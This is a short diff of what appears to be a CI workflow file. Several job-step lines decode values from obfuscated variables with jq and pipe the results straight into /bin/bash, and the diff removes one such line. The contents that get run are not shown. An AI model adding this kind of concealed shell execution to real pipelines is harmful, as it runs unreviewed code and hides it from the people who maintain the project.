@@ -32,7 +32,6 @@ jobs:
           printf '%s' "$i93869" | jq -r .uyv7864 | /bin/bash
           echo $xos76157 | jq -r .efnk9719 | /bin/bash
           echo $qwa66 | jq -r .msn9 | /bin/bash
-          echo $eqs2514 | jq -r .q0781 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
